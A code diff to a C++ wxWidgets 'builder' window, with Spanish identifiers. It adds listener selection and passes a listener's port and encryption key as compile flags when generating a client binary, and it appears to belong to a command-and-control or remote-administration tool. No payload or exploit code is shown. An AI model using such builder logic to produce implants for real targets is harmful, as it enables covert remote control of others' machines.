@@ -1,9 +1,15 @@
+#include "Server.hpp"
 #include "frame_builder.hpp"
+#include "frame_listener.hpp"
 #include "misc.hpp"
 #include <wx/utils.h> 
 
+extern Servidor* p_Servidor;
+
 wxBEGIN_EVENT_TABLE(FrameBuilder, wxFrame)
 	EVT_BUTTON(EnumBuilderIDS::BTN_Generar, FrameBuilder::OnGenerarCliente)
+	EVT_BUTTON(EnumBuilderIDS::BTN_RefListeners, FrameBuilder::OnRefListeners)
+	EVT_TEXT(EnumBuilderIDS::CMB_Listeners, FrameBuilder::OnCambioListener)
 wxEND_EVENT_TABLE()
 
 FrameBuilder::FrameBuilder(wxWindow* pParent)
@@ -25,8 +31,27 @@ FrameBuilder::FrameBuilder(wxWindow* pParent)
 	boxHost->Add(this->txtPort, 0);
 	boxHost->AddSpacer(10);
 
+	//Listener
+	wxArrayString listeners_opts;
+	this->vc_listeners = p_Servidor->m_ListenerVectorCopy();
+	for (size_t i = 0; i < this->vc_listeners.size(); i++) {
+		listeners_opts.Add(this->vc_listeners[i].nombre);
+	}
+
+	wxBoxSizer* boxListener = new wxBoxSizer(wxHORIZONTAL);
+	this->cmbListeners = new wxComboBox(pnl_Main, EnumBuilderIDS::CMB_Listeners, "Seleccione un listener", wxDefaultPosition, wxDefaultSize, listeners_opts, wxCB_READONLY);
+	this->btnRefListeners = new wxButton(pnl_Main, EnumBuilderIDS::BTN_RefListeners, "Refrescar lista");
+
+	boxListener->AddSpacer(10);
+	boxListener->Add(new wxStaticText(pnl_Main, wxID_ANY, "Listener:"), 0);
+	boxListener->Add(this->cmbListeners, 1, wxALL | wxEXPAND);
+	boxListener->Add(this->btnRefListeners, 0);
+	boxListener->AddSpacer(10);
+
 	box_Server->AddSpacer(10);
 	box_Server->Add(boxHost);
+	box_Server->AddSpacer(10);
+	box_Server->Add(boxListener, 1, wxALL | wxEXPAND);
 	box_Server->AddSpacer(10);
 
 	pnl_Main->SetSizer(box_Server);
@@ -83,15 +108,22 @@ FrameBuilder::FrameBuilder(wxWindow* pParent)
 
 	this->SetSizeHints(this->GetSize(), this->GetSize());
 
+	this->RefrescarLista();
+
 	ChangeMyChildsTheme(this, THEME_BACKGROUND_COLOR, THEME_FOREGROUND_COLOR, THEME_FONT_GLOBAL);
 }
 
 void FrameBuilder::OnGenerarCliente(wxCommandEvent& event) {
 
+	if (this->strClave == "" || this->cmbListeners->GetValue() == "") {
+		wxMessageBox("No se ha seleccionado un listener!!!", "Builder", wxICON_WARNING);
+		return;
+	}
+
 	//Folder temporal para compilar binario
 	wxString strNewfolder = ".\\build-" + RandomID(8);
 	if (!::CreateDirectoryA(strNewfolder, NULL)) {
-		wxMessageBox("No se pudo crear el directorio " + strNewfolder);
+		wxMessageBox("[1] No se pudo crear el directorio " + strNewfolder, "Builder", wxICON_ERROR);
 		return;
 	}
 
@@ -142,21 +174,27 @@ void FrameBuilder::OnGenerarCliente(wxCommandEvent& event) {
 
 	//Talvez una mejor verificacion de ip :v
 	if (strHost.Length() == 0) {
-		wxMessageBox("El host es invalido", "Error");
+		wxMessageBox("El host es invalido", "Builder", wxICON_ERROR);
 		return;
 	}
 
+	//Agregar informacion de conexion
 	strCmd.append("-DSRV_ADDR=");
 	strCmd.append(strHost);
 	strCmd.append(1, ' ');
 	
 	if (strPort.Length() == 0) {
-		wxMessageBox("El port es invalido", "Error");
+		wxMessageBox("El port es invalido", "Builder", wxICON_ERROR);
 		return;
 	}
 
 	strCmd.append("-DSRV_ADDR_PORT=");
 	strCmd.append(strPort);
+
+	//Llave de cifrado de listener
+	strCmd.append(" -DSRV_ENC_KEY=\"");
+	strCmd.append(this->strClave);
+	strCmd.append("\" ");
 	
 	wxString strRutaSource = " ";
 
@@ -178,7 +216,7 @@ void FrameBuilder::OnGenerarCliente(wxCommandEvent& event) {
 	wxShell(strCmd);
 
 	if (!::CreateDirectoryA(strNewfolder, NULL)) {
-		wxMessageBox("No se pudo crear el directorio " + strNewfolder);
+		wxMessageBox("[2] No se pudo crear el directorio " + strNewfolder, "Builder", wxICON_ERROR);
 		return;
 	}
 
@@ -186,5 +224,43 @@ void FrameBuilder::OnGenerarCliente(wxCommandEvent& event) {
 
 	wxShell(strCmd);
 
-	wxMessageBox("Cliente listo en " + strNewfolder);
+	wxMessageBox("Cliente listo en " + strNewfolder, "Builder");
+}
+
+void FrameBuilder::OnRefListeners(wxCommandEvent& event) {
+	this->RefrescarLista();
+}
+
+void FrameBuilder::OnCambioListener(wxCommandEvent& event) {
+	wxString listener = this->cmbListeners->GetValue();
+	if (this->vc_listeners.size() > 0 && listener != "") {
+		for (size_t i = 0; i < this->vc_listeners.size(); i++) {
+			if(this->vc_listeners[i].nombre == listener) {
+				this->txtPort->ChangeValue(this->vc_listeners[i].puerto);
+				this->strClave = this->vc_listeners[i].clave_acceso;
+				break;
+			}
+		}
+	}
+}
+
+void FrameBuilder::RefrescarLista() {
+	//Obtener lista de listeners nuevamente y actualizar combobox
+
+	wxArrayString listeners_opts;
+	this->vc_listeners = p_Servidor->m_ListenerVectorCopy();
+	if (this->vc_listeners.size() == 0) {
+		//Spawn frame de listeners para crear uno
+		frameListeners* frame_listener = new frameListeners(this);
+		frame_listener->Show();
+		return;
+	}
+
+	for (size_t i = 0; i < this->vc_listeners.size(); i++) {
+		listeners_opts.Add(this->vc_listeners[i].nombre);
+	}
+
+	this->cmbListeners->Clear();
+	this->cmbListeners->Append(listeners_opts);
+	this->cmbListeners->Refresh();
 }
